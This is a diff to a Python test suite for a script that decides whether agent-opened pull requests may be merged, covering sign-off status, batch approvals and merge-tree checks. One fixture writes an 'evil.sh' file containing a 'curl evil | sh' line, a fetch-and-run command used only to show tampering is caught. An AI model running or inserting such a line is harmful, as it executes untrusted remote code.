@@ -6,11 +6,14 @@ unmade (`FakeApi.merged` stays empty)."""
 import base64
 import copy
 import io
+import os
 import re
 import subprocess
 import sys
+import tempfile
 import unittest
 from pathlib import Path
+from unittest import mock
 
 sys.path.insert(0, str(Path(__file__).resolve().parent))
 sys.path.insert(0, str(Path(__file__).resolve().parent / "hooks"))
@@ -51,6 +54,21 @@ def fake_resolver(table=None, calls=None):
     return resolve
 
 
+DRAFT = "Status: working draft, 2026-11-21; not owner-approved (see issue #15)."
+
+
+def doc_text(status=DRAFT, lines_before=0):
+    return "# Title\n\n" + "filler\n" * lines_before + f"{status}\n\nBody.\n"
+
+
+def with_contents(api, name, base=None, head=None):
+    """Serve a file's text at the base (main) and at the head (SHA), as the contents API does."""
+    for ref, text in (("main", base), (SHA, head)):
+        if text is not None:
+            api.data[f"repos/{REPO}/contents/{name}?ref={ref}"] = {"content": base64.b64encode(text.encode()).decode()}
+    return api
+
+
 def file_entry(name, status="modified", patch="@@ -1 +1 @@\n-old\n+new", previous=None):
     entry = {"filename": name, "status": status, "patch": patch}
     if previous:
@@ -74,6 +92,8 @@ class FakeApi:
         self.requested.append(path)
         if "/contents/app/src/main/res/" in path and path not in self.data:  # a res XML file at the head: harmless unless a test says otherwise
             return {"content": base64.b64encode(b"<resources><string name='a'>A</string></resources>").decode()}
+        if f"repos/{REPO}/contents/docs/" in path and path not in self.data:  # a docs file: a working draft, unless a test says otherwise
+            return {"content": base64.b64encode(doc_text().encode()).decode()}
         return copy.deepcopy(self.data[path])
 
     def pages(self, path, key=None):
@@ -105,9 +125,9 @@ def make_api(files=None, title="Update the plan", body="Refreshes section 4. See
     )
 
 
-def go(api, sha=SHA, kind="working-draft-docs", resolver=None):
+def go(api, sha=SHA, kind="working-draft-docs", resolver=None, flags=(), **kwargs):
     out, err = io.StringIO(), io.StringIO()
-    code = merge_ready.main([str(N), sha, kind], api=api, out=out, err=err, resolver=resolver or fake_resolver())
+    code = merge_ready.main([*flags, str(N), sha, kind], api=api, out=out, err=err, resolver=resolver or fake_resolver(), **kwargs)
     return code, out.getvalue() + err.getvalue()
 
 
@@ -447,7 +467,7 @@ class UsageTests(unittest.TestCase):
         self.assertEqual(api.merged, [])
 
     def test_kinds_are_exactly_the_authorized_ones(self):
-        self.assertEqual(sorted(merge_ready.KINDS), ["dependabot", "general", "tasks-sync", "working-draft-docs"])
+        self.assertEqual(sorted(merge_ready.KINDS), ["dependabot", "general", "owner-batch", "tasks-sync", "working-draft-docs"])
 
     def test_cli_unknown_kind(self):
         res = self.cli("12", SHA, "everything")
@@ -455,10 +475,13 @@ class UsageTests(unittest.TestCase):
         self.assertIn("unknown kind", res.stderr + res.stdout)
 
     def test_cli_bad_arguments(self):
-        for args in (("x", SHA, "dependabot"), ("12", "abc", "dependabot"), ("12", SHA), ("12", SHA, "dependabot", "extra"), ()):
+        for args in (("x", SHA, "dependabot"), ("12", "abc", "dependabot"), ("12", SHA), ("12", SHA, "dependabot", "extra"), (),
+                     ("--approval", "12", SHA, "owner-batch"), ("--approval", "x", "12", SHA, "owner-batch"),  # no value, or not a comment id
+                     ("--approval", "5", "12", SHA, "general"),  # an approval belongs to owner-batch only
+                     ("--wait", "--wait", "12", SHA, "general", "extra"), ("--bogus", "12", SHA, "general")):
             with self.subTest(args=args):
                 res = self.cli(*args)
-                self.assertNotEqual(res.returncode, 0)
+                self.assertEqual(res.returncode, 2, res.stderr)  # a usage error, before any API call (R2-03)
 
     def test_api_error_refuses(self):
         class Broken(FakeApi):
@@ -480,6 +503,194 @@ class UsageTests(unittest.TestCase):
         code, text = go(api)
         self.assertNotEqual(code, 0)
         self.assertIn("405", text)
+
+
+class SignOffTests(unittest.TestCase):
+    """R4-02: the sign-off check reads the status paragraph of the head, not a count of phrases in the patch."""
+
+    KINDS = (("working-draft-docs", "docs/milestones/M1.md"), ("general", "docs/milestones/M1.md"), ("general", "docs/PLAN.md"))
+    SWAP = "@@ -3 +3 @@\n-" + DRAFT + "\n+{}"
+
+    def attempt(self, kind, name, head, base=None, status="modified", previous=None):
+        patch = self.SWAP.format(DRAFT if head is None else "Status: x; not owner-approved (see issue #15).")
+        api = make_api(files=[file_entry(name, status=status, patch=patch, previous=previous)])
+        with_contents(api, previous or name, base=doc_text() if base is None else base)
+        with_contents(api, name, head=head)
+        code, text = go(api, kind=kind)
+        return code, text, api
+
+    def test_a_valid_status_paragraph_at_the_head_merges(self):
+        two_lines = "Status: working draft, matched to the stories\n(task OQ-15); the plan itself is not owner-approved (see issue #15)."
+        for kind, name in self.KINDS:
+            for head in (doc_text(), doc_text(two_lines), doc_text(DRAFT.replace("2026-11-21", "2026-12-01"))):
+                with self.subTest(kind=kind, name=name, head=head):
+                    code, text, api = self.attempt(kind, name, head)
+                    self.assertEqual(code, 0, text)
+
+    def test_a_reworded_misplaced_or_quoted_status_is_refused_even_when_the_phrase_survives(self):
+        bad = {"sign-off that quotes the phrase": doc_text("Status: approved by the owner, 2026-11-21 (was: not owner-approved (see issue #15))."),
+               "status pushed below the top": doc_text(lines_before=30),
+               "status in a code fence": "# T\n\n```\n" + DRAFT + "\n```\n",
+               "status in a quote": "# T\n\n> " + DRAFT + "\n",
+               "no issue reference": doc_text("Status: working draft; not owner-approved."),
+               "not a working draft": doc_text("Status: final; not owner-approved (see issue #15)."),
+               "phrase only in the body": "# T\n\nText.\n\nThis part is not owner-approved (see issue #15).\n"}
+        for kind, name in self.KINDS:
+            for why, head in bad.items():
+                with self.subTest(kind=kind, name=name, why=why):
+                    code, text, api = self.attempt(kind, name, head)
+                    self.assertNotEqual(code, 0, text)
+                    self.assertRegex(text, r"status paragraph")
+                    self.assertEqual(api.merged, [])
+
+    def test_a_new_draft_needs_its_status_paragraph(self):
+        for kind in ("working-draft-docs", "general"):
+            with self.subTest(kind=kind, case="missing"):
+                code, text, api = self.attempt(kind, "docs/milestones/M2.md", "# M2\n\nNo status here.\n", status="added")
+                self.assertNotEqual(code, 0, text)
+                self.assertRegex(text, r"M2\.md.*status paragraph")
+                self.assertEqual(api.merged, [])
+            with self.subTest(kind=kind, case="present"):
+                self.assertEqual(self.attempt(kind, "docs/milestones/M2.md", doc_text(), status="added")[0], 0)
+
+    def test_a_renamed_draft_is_judged_against_the_old_file_at_the_base(self):
+        code, text, api = self.attempt("working-draft-docs", "docs/milestones/M1b.md", "# T\n\nNo status.\n", status="renamed",
+                                       previous="docs/milestones/M1.md")
+        self.assertNotEqual(code, 0, text)
+        self.assertRegex(text, r"status paragraph")
+
+    def test_a_rename_to_another_extension_or_an_upper_case_md_is_still_judged(self):  # R1-02: the extension of either name, casefolded
+        approved = doc_text("Status: approved by the owner, 2026-11-22 (was: not owner-approved (see issue #15)).")
+        bad = {"draft renamed to .txt": ("docs/milestones/M1.txt", approved, "renamed", "docs/milestones/M1.md"),
+               "draft renamed to .MD": ("docs/milestones/M1.MD", approved, "renamed", "docs/milestones/M1.md"),
+               "draft renamed from .MD to .txt": ("docs/milestones/M1.txt", approved, "renamed", "docs/milestones/M1.MD"),
+               "new .MD without a status": ("docs/milestones/M2.MD", "# M2\n\nNo status.\n", "added", None),
+               "new .Md without a status": ("docs/milestones/M2.Md", "# M2\n\nNo status.\n", "added", None)}
+        for why, (name, head, status, previous) in bad.items():
+            with self.subTest(why=why):
+                code, text, api = self.attempt("working-draft-docs", name, head, status=status, previous=previous)
+                self.assertNotEqual(code, 0, text)
+                self.assertRegex(text, r"status paragraph")
+                self.assertEqual(api.merged, [])
+        for why, (name, status, previous) in {"rename that keeps the status": ("docs/milestones/M1.txt", "renamed", "docs/milestones/M1.md"),
+                                              "new .MD with a status": ("docs/milestones/M2.MD", "added", None)}.items():
+            with self.subTest(why=why):
+                self.assertEqual(self.attempt("working-draft-docs", name, doc_text(), status=status, previous=previous)[0], 0)
+        for name in ("docs/product/wireframes/01-sign-in-dark.png", "docs/milestones/notes.txt"):  # never a draft in either name: not held to it
+            with self.subTest(name=name):
+                self.assertEqual(go(make_api(files=[file_entry(name)]))[0], 0)
+
+    def test_a_doc_that_was_never_a_draft_is_not_held_to_the_status(self):  # approved docs and ordinary docs keep merging
+        approved = "# Stories\n\nStatus: owner-approved 2026-11-18 (issue #15 comment 6991804241).\n"
+        self.assertEqual(self.attempt("working-draft-docs", "docs/product/stories.md", approved, base=approved)[0], 0)
+        api = with_contents(make_api(files=[file_entry("docs/notes.md", status="added")]), "docs/notes.md", head="# Notes\n")
+        self.assertEqual(go(api, kind="general")[0], 0)
+
+    def test_an_unreadable_head_refuses(self):  # fail closed
+        class NoContents(FakeApi):
+            def get(self, path):
+                if "/contents/" in path:
+                    raise merge_ready.ApiError("gh api contents: HTTP 502")
+                return super().get(path)
+
+        for kind, name in self.KINDS:
+            with self.subTest(kind=kind, name=name):
+                api = NoContents(make_api(files=[file_entry(name, patch=self.SWAP.format(DRAFT))]).data)
+                code, text = go(api, kind=kind)
+                self.assertNotEqual(code, 0, text)
+                self.assertEqual(api.merged, [])
+
+    def test_the_real_drafts_pass_the_structural_check(self):
+        for name in ("docs/PLAN.md", "docs/milestones/M1.md"):
+            with self.subTest(name=name):
+                self.assertTrue(merge_ready.draft_status((ROOT / name).read_text(encoding="utf-8")))
+
+
+class EmptyPatchTests(unittest.TestCase):
+    """R5-01: an entry with `"patch": ""` (the API sends that for some changes) is a missing patch, not a diff with nothing in it."""
+
+    def test_every_check_that_needs_a_patch_refuses_an_empty_one(self):
+        cases = (("working-draft-docs", "docs/milestones/M1.md", r"no patch"), ("general", "docs/PLAN.md", r"no patch"),
+                 ("general", "app/src/main/kotlin/dev/listicles/A.kt", r"no patch"), ("dependabot", ".github/workflows/ci.yml", r"no patch from the API"),
+                 ("dependabot", "gradle/wrapper/gradle-wrapper.properties", r"no patch from the API"))
+        for kind, name, reason in cases:
+            for patch in ("", None):
+                with self.subTest(kind=kind, name=name, patch=patch):
+                    api = make_api(files=[file_entry(name, patch=patch)])
+                    code, text = go(api, kind=kind)
+                    self.assertNotEqual(code, 0, text)
+                    self.assertRegex(text, reason)
+                    self.assertEqual(api.merged, [])
+
+    def test_an_image_without_a_patch_still_merges(self):  # binary files have none, in either form
+        for patch in ("", None):
+            with self.subTest(patch=patch):
+                self.assertEqual(go(make_api(files=[file_entry("docs/product/wireframes/01-sign-in-dark.png", patch=patch)]))[0], 0)
+
+
+class GhApiTests(unittest.TestCase):
+    """R1-09: GhApi retries a flake by the HTTP status `gh api` reports, also for the merge PUT, and never because a number appears in a message."""
+
+    def call(self, *results, method="get"):
+        """Run one GhApi call against fake `gh api` results (returncode, stdout, stderr), in order: (value or the ApiError, argv list, sleeps)."""
+        argv, sleeps = [], []
+
+        def fake_run(args, **kwargs):
+            argv.append(args)
+            code, out, err = results[min(len(argv), len(results)) - 1]
+            return subprocess.CompletedProcess(args, code, out, err)
+
+        api = merge_ready.GhApi()
+        with mock.patch.object(merge_ready.subprocess, "run", fake_run), mock.patch.object(merge_ready.time, "sleep", sleeps.append):
+            try:
+                value = api.get("repos/x/y") if method == "get" else api.put("repos/x/y/merge", {"merge_method": "squash", "sha": SHA})
+            except merge_ready.ApiError as e:
+                value = e
+        return value, argv, sleeps
+
+    def test_a_flake_status_is_retried_and_the_second_answer_counts(self):
+        for status in (429, 500, 502, 503, 504):
+            for form, err in (("json message", f"gh: Server Error (HTTP {status})"),
+                              ("html or empty body", f"gh: HTTP {status}"),  # R1-01: gh prints both forms
+                              ("after a note line", f"note: retry later\ngh: HTTP {status}\n")):
+                with self.subTest(status=status, form=form):
+                    value, argv, sleeps = self.call((1, "<html>Bad Gateway</html>", err), (0, '{"ok": 1}', ""))
+                    self.assertEqual(value, {"ok": 1})
+                    self.assertEqual(len(argv), 2)
+                    self.assertEqual(sleeps, [1])
+
+    def test_the_merge_put_is_retried_with_the_same_arguments(self):
+        value, argv, sleeps = self.call((1, "", "gh: Bad Gateway (HTTP 502)"), (0, '{"merged": true}', ""), method="put")
+        self.assertEqual(value, {"merged": True})
+        self.assertEqual(argv[0], argv[1])
+        self.assertEqual(argv[0][:4], ["gh", "api", "-X", "PUT"])
+        self.assertIn(f"sha={SHA}", argv[0])
+
+    def test_other_statuses_and_a_number_in_a_message_are_not_retried(self):
+        errors = {"not mergeable": "gh: Pull Request is not mergeable (HTTP 405)", "head moved": "gh: Head branch was modified (HTTP 409)",
+                  "validation": "gh: Validation Failed (HTTP 422)", "not found": "gh: Not Found (HTTP 404)", "forbidden": "gh: Forbidden (HTTP 403)",
+                  "no status": "gh: error connecting to api.github.com",
+                  "502 in the message": "gh: PR 502 is not mergeable, 429 files changed, sha 5030a (HTTP 405)",
+                  "bare form of another status": "gh: HTTP 404", "bare form with text after it": "gh: HTTP 502 was expected here",
+                  "bare form quoted in a message": "gh: PR text says gh: HTTP 502 (HTTP 409)", "bare form inside a line": "see gh: HTTP 502"}
+        for why, err in errors.items():
+            for method in ("get", "put"):
+                with self.subTest(why=why, method=method):
+                    value, argv, sleeps = self.call((1, "", err), (0, "{}", ""), method=method)
+                    self.assertIsInstance(value, merge_ready.ApiError)
+                    self.assertEqual((len(argv), sleeps), (1, []))
+
+    def test_a_status_in_the_body_on_stdout_does_not_count_when_gh_reports_another(self):
+        body = '{"message": "Conflict: 502 files", "status": "502"}'
+        value, argv, _ = self.call((1, body, "gh: Conflict (HTTP 409)"), (0, "{}", ""))
+        self.assertIsInstance(value, merge_ready.ApiError)
+        self.assertEqual(len(argv), 1)
+
+    def test_it_gives_up_after_the_retries_and_reports_the_last_error(self):
+        value, argv, sleeps = self.call((1, "", "gh: Service Unavailable (HTTP 503)"))
+        self.assertIsInstance(value, merge_ready.ApiError)
+        self.assertIn("503", str(value))
+        self.assertEqual((len(argv), len(sleeps)), (merge_ready.RETRIES, merge_ready.RETRIES - 1))
 
 
 class GeneralKindTests(unittest.TestCase):
@@ -748,6 +959,345 @@ class GeneralKindTests(unittest.TestCase):
         self.refused(make_api(files=[file_entry(self.ALLOWED[0])], checks=[run("guards"), run("tasks")]), r"static.*missing")
 
 
+C1, M1, M2 = "1" * 40, "2" * 40, SHA  # the approved commit, a first update-branch merge, and the head (a second one)
+BASE0, MAIN1, MAIN2 = "4" * 40, "5" * 40, "6" * 40
+TREE = "9" * 40  # the tree of every fake update-branch merge, and what the fake `git merge-tree` returns
+CID = 7007999999
+
+
+def commit(sha, parents, message="Edit", tree=TREE):
+    return {"sha": sha, "parents": [{"sha": p} for p in parents], "commit": {"message": message, "tree": {"sha": tree}}}
+
+
+def fake_merge_tree(result=TREE, calls=None, fail=None):
+    """Stands in for `git merge-tree --write-tree p1 p2`: the automatic merge's tree, None when it has conflicts, or an error."""
+    def merge_tree(p1, p2):
+        if calls is not None:
+            calls.append((p1, p2))
+        if fail:
+            raise merge_ready.MergeCheckError(fail)
+        return result(p1, p2) if callable(result) else result
+    return merge_tree
+
+
+def approval_comment(listed, login="bondo", assoc="OWNER", issue=15, edited=False, line="batch approval: "):
+    return {"user": {"login": login}, "author_association": assoc, "issue_url": f"https://api.github.com/repos/{REPO}/issues/{issue}",
+            "body": f"{line}{listed}\nThanks.", "created_at": "2026-11-19T12:00:00Z",
+            "updated_at": "2026-11-19T12:05:00Z" if edited else "2026-11-19T12:00:00Z"}
+
+
+def batch_api(listed=None, commits=None, parent_status="behind", comment=None, earlier=None):
+    """A PR whose head is M2 (two update-branch merges after the approved commit C1) and a batch approval comment for it."""
+    commits = commits if commits is not None else [commit(C1, [BASE0]), commit(M1, [C1, MAIN1], "Merge branch 'main' into x"),
+                                                    commit(M2, [M1, MAIN2], "Merge branch 'main' into x")]
+    api = make_api(files=[file_entry("CLAUDE.md")], commits=commits)
+    for main_sha in (MAIN1, MAIN2):
+        api.data[f"repos/{REPO}/compare/main...{main_sha}"] = {"status": parent_status, "files": []}
+    api.data[f"repos/{REPO}/issues/comments/{CID}"] = comment or approval_comment(listed if listed is not None else f"#{N}@{C1[:7]}")
+    for num, merged in (earlier or {}).items():
+        api.data[f"repos/{REPO}/pulls/{num}"] = {"merged": merged, "state": "closed" if merged else "open"}
+    return api
+
+
+def go_batch(api, sha=M2, flags=("--approval", str(CID)), merge_tree=None, **kwargs):
+    return go(api, sha=sha, kind="owner-batch", flags=flags, merge_tree=merge_tree or fake_merge_tree(), **kwargs)
+
+
+class OwnerBatchTests(unittest.TestCase):
+    """Kind `owner-batch` (owner decision D1/D2, #15 comment 7007421567): any paths, but only a PR the owner's batch approval lists with a
+    head SHA, and only at that head or at a head that adds update-branch merges of main whose tree is git's automatic merge (R1-02 of #245)."""
+
+    def refused(self, api, reason, sha=M2, flags=("--approval", str(CID)), merge_tree=None):
+        code, text = go_batch(api, sha=sha, flags=flags, merge_tree=merge_tree)
+        self.assertNotEqual(code, 0, text)
+        self.assertEqual(api.merged, [], "a refused PR must not be merged")
+        self.assertRegex(text, reason)
+
+    def merged(self, api, sha=M2, **kwargs):
+        code, text = go_batch(api, sha=sha, **kwargs)
+        self.assertEqual(code, 0, text)
+        self.assertEqual(len(api.merged), 1)
+        self.assertEqual(api.merged[0][1]["sha"], sha)
+        self.assertEqual(api.merged[0][1]["merge_method"], "squash")
+
+    def test_head_equal_to_the_approved_sha_is_merged_with_any_paths(self):
+        api = make_api(files=[file_entry("CLAUDE.md"), file_entry(".claude/settings.json")], commits=[commit(SHA, [BASE0])])
+        api.data[f"repos/{REPO}/issues/comments/{CID}"] = approval_comment(f"#{N}@{SHA[:7]}")
+        self.merged(api, sha=SHA)
+
+    def test_head_after_update_branch_merges_with_gits_automatic_tree_is_merged(self):
+        calls = []
+        self.merged(batch_api(), merge_tree=fake_merge_tree(calls=calls))
+        self.assertEqual(calls, [(C1, MAIN1), (M1, MAIN2)], "each merge is checked from its own two parents")
+
+    def test_the_pr_may_sit_anywhere_in_the_list_when_the_earlier_prs_are_merged(self):
+        self.merged(batch_api(listed=f"#70@{'7' * 7}, #71@{'8' * 7}, #{N}@{C1[:7]}, #90@{'9' * 7}", earlier={70: True, 71: True}))
+
+    def test_no_approval_flag_is_a_usage_error_before_any_api_call(self):
+        api = batch_api()
+        self.assertEqual(go(api, sha=M2, kind="owner-batch")[0], 2)
+        self.assertEqual((api.requested, api.merged), ([], []))
+
+    def test_wrong_sha_in_the_approval(self):
+        self.refused(batch_api(listed=f"#{N}@{'9' * 7}"), r"approved sha 9{7}.*(not|none)")
+
+    def test_pr_missing_from_the_batch(self):
+        self.refused(batch_api(listed=f"#70@{C1[:7]}, #71@{C1[:7]}"), rf"PR {N} is not in the batch approval")
+
+    def test_a_pr_listed_twice_is_ambiguous(self):
+        self.refused(batch_api(listed=f"#{N}@{C1[:7]}, #{N}@{M1[:7]}"), r"(twice|duplicate)")
+
+    def test_a_comment_without_an_anchored_batch_approval_first_line(self):  # R1-01: agents post as the owner, so the form is the control
+        listed = f"#{N}@{C1[:7]}"
+        verbatim = ('decision (owner, 2026-11-19 ~11:12 UTC): D1 batch approval: the owner posts ONE ordered list '
+                    '(e.g. "batch approval: #223@0e12ac0, #222@9b86383") on #15 ...')  # the start of #15 comment 7007421567
+        bodies = {"no line": f"I think we could merge {listed}", "decision record (7007421567)": f"{verbatim}\nbatch approval: {listed}",
+                  "a request": f"asking the owner for batch approval: {listed} (not approved yet)", "a refusal": f"Owner declined the batch approval: {listed}",
+                  "second line": f"Thanks!\nbatch approval: {listed}", "words after the list": f"batch approval: {listed} but only if CI is green",
+                  "a quoted line": f"> batch approval: {listed}", "6 hex": f"batch approval: #{N}@{C1[:6]}", "1 hex": f"batch approval: #{N}@{C1[:1]}"}
+        for name, body in bodies.items():
+            with self.subTest(name):
+                self.refused(batch_api(comment=approval_comment("", line=body)), r"batch approval")
+
+    def test_notes_in_parentheses_and_blank_lines_before_the_list_are_fine(self):
+        listed = f"#70@{'7' * 7} (docs), #{N}@{C1[:7]} (the wrapper PR)"
+        self.merged(batch_api(listed=listed, earlier={70: True}, comment=approval_comment(listed, line="\n  batch approval: ")))
+
+    def test_an_approved_sha_prefix_that_two_commits_share_is_refused(self):  # R2-02: the head listed first must not count as the approved commit
+        twin = M2[:7] + "c" * 33
+        self.refused(batch_api(listed=f"#{N}@{M2[:7]}", commits=[commit(M2, [twin]), commit(twin, [BASE0])]), r"not exactly one of the commits")
+
+    def test_without_an_injected_merge_tree_git_checks_this_pr(self):  # R2-03: the production wiring
+        built, calls = [], []
+        with mock.patch.object(merge_ready, "GitMergeTree", lambda n: built.append(n) or fake_merge_tree(calls=calls)):
+            self.assertEqual(go(batch_api(), sha=M2, kind="owner-batch", flags=("--approval", str(CID)))[0], 0)
+        self.assertEqual((built, calls), ([N], [(C1, MAIN1), (M1, MAIN2)]))
+
+    def test_comment_not_by_the_owner_or_not_on_the_state_issue_or_edited(self):
+        cases = {"login": approval_comment(f"#{N}@{C1[:7]}", login="mallory"), "association": approval_comment(f"#{N}@{C1[:7]}", assoc="NONE"),
+                 "other issue": approval_comment(f"#{N}@{C1[:7]}", issue=16),
+                 "edited": approval_comment(f"#{N}@{C1[:7]}", edited=True), "#150": approval_comment(f"#{N}@{C1[:7]}", issue=150)}
+        for name, comment in cases.items():
+            with self.subTest(name):
+                self.refused(batch_api(comment=comment), r"approval comment.*(owner|#15|edited)")
+
+    def test_anything_but_update_branch_merges_of_main_after_the_approved_sha_is_refused(self):
+        merge = commit(M2, [M1, MAIN2], "Merge branch 'main' into x")
+        cases = {"non-main commit in the middle": dict(commits=[commit(C1, [BASE0]), commit(M1, [C1], "Edit another file"), merge]),
+                 "non-main commit as the head": dict(commits=[commit(C1, [BASE0]), commit(M2, [C1], "One more edit")]),
+                 "root commit after the approved sha": dict(commits=[commit(C1, [BASE0]), commit("0" * 40, []), commit(M2, [C1, "0" * 40])]),  # R2-04
+                 "merge of another branch": dict(parent_status="ahead"), "diverged merge": dict(parent_status="diverged"),
+                 "head not descending from the approved commit": dict(commits=[commit(C1, [BASE0]), commit(M2, [BASE0, MAIN2])])}
+        for name, kwargs in cases.items():
+            with self.subTest(name):
+                self.refused(batch_api(**kwargs), r"(not an update-branch merge of main|descend)")
+
+    def test_an_octopus_merge_after_the_approved_sha_is_refused(self):  # R3-01: only a merge with exactly two parents can be an update-branch merge
+        for name, parents in (("main twice", [M1, MAIN1, MAIN2]), ("a third parent that is not main", [M1, MAIN2, C1]), ("one parent", [M1])):
+            with self.subTest(name):
+                calls = []
+                commits = [commit(C1, [BASE0]), commit(M1, [C1, MAIN1], "Merge branch 'main' into x"), commit(M2, parents, "Merge branches into x")]
+                self.refused(batch_api(commits=commits), r"not an update-branch merge of main", merge_tree=fake_merge_tree(calls=calls))
+                self.assertEqual(calls, [(C1, MAIN1)], "the octopus is refused before git is asked about it")
+
+    def test_a_merge_whose_tree_is_not_gits_automatic_merge_is_refused(self):  # a moved line, an edit or an extra file in the merge commit
+        for name, first, second in (("the head merge", TREE, "e" * 40), ("the first of two merges", "e" * 40, TREE)):
+            with self.subTest(name):
+                self.refused(batch_api(commits=[commit(C1, [BASE0]), commit(M1, [C1, MAIN1], tree=first), commit(M2, [M1, MAIN2], tree=second)]),
+                             r"automatic merge")
+
+    def test_a_merge_that_git_cannot_do_without_conflicts_needs_a_fresh_approval(self):  # a hand-resolved conflict
+        self.refused(batch_api(), r"conflict.*fresh owner approval", merge_tree=fake_merge_tree(result=None))
+
+    def test_a_failing_merge_check_refuses_instead_of_merging(self):  # fail closed
+        api = batch_api()
+        code, text = go_batch(api, merge_tree=fake_merge_tree(fail="git fetch of pull/77/head failed"))
+        self.assertEqual(code, 1, text)
+        self.assertIn("pull/77/head failed", text)
+        self.assertEqual(api.merged, [])
+
+    def test_an_earlier_pr_of_the_batch_that_is_not_merged_yet(self):
+        self.refused(batch_api(listed=f"#70@{'7' * 7}, #{N}@{C1[:7]}", earlier={70: False}), r"PR 70.*(earlier|not merged)")
+
+    def test_head_moved_and_the_common_checks_still_apply(self):
+        api = batch_api()
+        api.data[f"repos/{REPO}/commits/{OTHER_SHA}/check-runs"] = [run(c) for c in REQUIRED]
+        self.refused(api, r"head .*not", sha=OTHER_SHA)
+        api = batch_api()
+        api.data[f"repos/{REPO}/pulls/{N}"]["mergeable_state"] = "behind"
+        self.refused(api, r"mergeable_state.*behind")
+        api = batch_api()
+        api.data[f"repos/{REPO}/pulls/{N}"]["body"] = "closes #12"
+        self.refused(api, r"closing keyword")
+
+
+class MergeTreeGitTests(unittest.TestCase):
+    """R1-02 of #245 with real git: the merge agent's clean checkout fetches main and pull/N/head, and a merge of main after the approved
+    sha is accepted only if its tree equals `git merge-tree --write-tree` of its two parents with no conflicts."""
+
+    ENV = {"GIT_CONFIG_GLOBAL": os.devnull, "GIT_CONFIG_SYSTEM": os.devnull, "GIT_AUTHOR_NAME": "t", "GIT_AUTHOR_EMAIL": "t@example.com",
+           "GIT_COMMITTER_NAME": "t", "GIT_COMMITTER_EMAIL": "t@example.com", "PATH": os.environ.get("PATH", "")}
+
+    def git(self, cwd, *args):
+        res = subprocess.run(["git", *args], cwd=cwd, env=self.ENV, capture_output=True, text=True, check=True)
+        return res.stdout.strip()
+
+    def write(self, name, text):
+        (self.work / name).write_text(text, encoding="utf-8")
+
+    def commit_all(self, message):
+        self.git(self.work, "add", "-A")
+        self.git(self.work, "commit", "-q", "-m", message)
+        return self.git(self.work, "rev-parse", "HEAD")
+
+    def setUp(self):
+        tmp = tempfile.TemporaryDirectory()
+        self.addCleanup(tmp.cleanup)
+        root = Path(tmp.name)
+        self.origin, self.work, self.agent = root / "origin.git", root / "work", root / "agent"
+        self.git(root, "init", "-q", "--bare", "-b", "main", str(self.origin))
+        self.git(root, "init", "-q", "-b", "main", str(self.work))
+        self.git(self.work, "remote", "add", "origin", str(self.origin))
+        self.write("a.txt", "1\n2\n3\n4\n5\n")
+        self.write("b.txt", "b\n")
+        self.base = self.commit_all("base")
+        self.git(self.work, "switch", "-q", "-c", "pr")
+        self.write("a.txt", "one\n2\n3\n4\n5\n")
+        self.c1 = self.commit_all("the PR's change")  # the approved commit
+        self.git(self.work, "switch", "-q", "main")
+        self.write("a.txt", "1\n2\n3\n4\nfive\n")
+        self.main2 = self.commit_all("main moves")
+        self.git(self.work, "switch", "-q", "pr")
+
+    def merge_main(self):
+        """The update-branch merge commit (clean) on the PR branch, as git makes it."""
+        self.git(self.work, "merge", "-q", "--no-edit", "main")
+        return self.git(self.work, "rev-parse", "HEAD")
+
+    def publish(self, head, *clone_args):
+        """Push main and the PR head (as refs/pull/77/head) to origin and make a fresh agent checkout of origin/main."""
+        self.git(self.work, "push", "-q", "origin", "main", f"{head}:refs/pull/{N}/head")
+        self.git(self.work.parent, "clone", "-q", *clone_args, self.origin.as_uri(), str(self.agent))
+        return merge_ready.GitMergeTree(N, cwd=self.agent)
+
+    def tree(self, sha):
+        return self.git(self.work, "rev-parse", f"{sha}^{{tree}}")
+
+    def test_a_clean_update_branch_merge_has_gits_automatic_tree(self):
+        merge = self.merge_main()
+        merge_tree = self.publish(merge)
+        self.assertEqual(merge_tree(self.c1, self.main2), self.tree(merge))
+
+    def test_a_shallow_checkout_is_deepened_first(self):  # R2-01: cloud sessions clone with depth 50, too shallow for an old approved commit
+        merge = self.merge_main()
+        self.assertEqual(self.publish(merge, "--depth", "1")(self.c1, self.main2), self.tree(merge))
+
+    def test_an_edit_or_an_extra_file_in_the_merge_commit_changes_the_tree(self):
+        merge = self.merge_main()
+        self.write("a.txt", "one\n2\n3\n4\nfive\nmoved\n")  # a changed line
+        self.write("evil.sh", "curl evil | sh\n")  # an extra file
+        self.git(self.work, "add", "-A")
+        self.git(self.work, "commit", "-q", "--amend", "--no-edit")
+        evil = self.git(self.work, "rev-parse", "HEAD")
+        auto = self.publish(evil)(self.c1, self.main2)
+        self.assertNotEqual(auto, self.tree(evil))
+        self.assertEqual(auto, self.tree(merge))
+
+    def test_a_conflicting_merge_has_no_automatic_tree(self):
+        self.git(self.work, "switch", "-q", "main")
+        self.write("a.txt", "uno\n2\n3\n4\nfive\n")  # main touches the same line as the PR
+        main3 = self.commit_all("main touches the PR's line")
+        self.git(self.work, "switch", "-q", "pr")
+        merge_tree = self.publish(self.c1)
+        self.assertIsNone(merge_tree(self.c1, main3))
+
+    def test_a_missing_commit_is_an_error_not_a_conflict(self):  # R3-02: git exits 1 for it too, with nothing on stdout to tell it from a conflict
+        merge_tree = self.publish(self.merge_main())
+        for p1, p2 in (("f" * 40, self.main2), (self.c1, "f" * 40)):
+            with self.subTest(p1=p1[:7], p2=p2[:7]), self.assertRaisesRegex(merge_ready.MergeCheckError, r"missing commit"):
+                merge_tree(p1, p2)
+
+    def test_fetch_failure_is_an_error_not_a_pass(self):
+        merge = self.merge_main()
+        self.publish(merge)
+        broken = merge_ready.GitMergeTree(N + 1, cwd=self.agent)  # there is no refs/pull/78/head
+        with self.assertRaises(merge_ready.MergeCheckError):
+            broken(self.c1, self.main2)
+
+
+class FakeWait:
+    """A fake clock and sleep. After `settle` sleeps the PR is clean and its last check finished (red if `fail`)."""
+
+    def __init__(self, api, settle=None, fail=False):
+        self.api, self.settle, self.fail, self.now, self.sleeps = api, settle, fail, 0.0, []
+
+    def sleep(self, seconds):
+        self.sleeps.append(seconds)
+        self.now += seconds
+        if len(self.sleeps) == self.settle:
+            self.api.data[f"repos/{REPO}/pulls/{N}"]["mergeable_state"] = "blocked" if self.fail else "clean"
+            last = run("static", conclusion="failure" if self.fail else "success")
+            self.api.data[f"repos/{REPO}/commits/{SHA}/check-runs"] = [run("guards"), run("tasks"), last]
+
+    def clock(self):
+        return self.now
+
+
+def pending_api(state="blocked"):
+    return make_api(state=state, checks=[run("guards"), run("tasks"), run("static", status="in_progress", conclusion=None)])
+
+
+class WaitTests(unittest.TestCase):
+    """`--wait`: poll while required checks are pending (or not reported yet); everything else still refuses at once."""
